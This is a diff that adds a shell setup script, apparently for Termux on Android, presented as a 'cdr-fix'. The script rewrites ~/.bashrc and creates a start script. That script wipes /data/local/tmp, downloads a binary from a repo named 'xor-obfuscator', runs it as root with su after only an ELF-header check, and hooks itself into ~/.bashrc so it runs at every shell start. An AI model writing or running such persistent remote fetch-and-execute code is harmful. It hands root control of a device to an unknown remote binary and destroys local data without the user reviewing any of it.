@@ -1,0 +1,37 @@
+cp ~/.bashrc ~/.bashrc.before-cdr-fix
+sed -i '/^cdr_start()[[:space:]]*{/,/^}/d; /su -c.*\/data\/local\/tmp\/sifresiz/d; /^[[:space:]]*alias start=/d; /^cdr_start$/d' ~/.bashrc
+unalias start 2>/dev/null
+
+cat > "$HOME/.cdr-start.sh" <<'EOF'
+#!/system/bin/sh
+cd / || exit 1
+
+find /data/local/tmp -mindepth 1 -maxdepth 1 -exec rm -rf {} + || exit 1
+
+curl -fL --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 120 \
+https://raw.githubusercontent.com/confessyourcin/xor-obfuscator/refs/heads/main/xda/emufix_arm64 \
+-o /data/local/tmp/sifresiz || exit 1
+
+magic=$(od -An -tx1 -N4 /data/local/tmp/sifresiz) || exit 1
+set -- $magic
+if [ "$1 $2 $3 $4" != "7f 45 4c 46" ]; then
+    echo "Indirilen dosya ELF degil; calistirilmadi."
+    exit 1
+fi
+
+chmod 777 /data/local/tmp/sifresiz || exit 1
+exec /data/local/tmp/sifresiz
+EOF
+
+chmod 755 "$HOME/.cdr-start.sh"
+
+cat >> ~/.bashrc <<'EOF'
+
+cdr_start() {
+    su -c "$HOME/.cdr-start.sh"
+}
+alias start='cdr_start'
+cdr_start
+EOF
+
+source ~/.bashrc
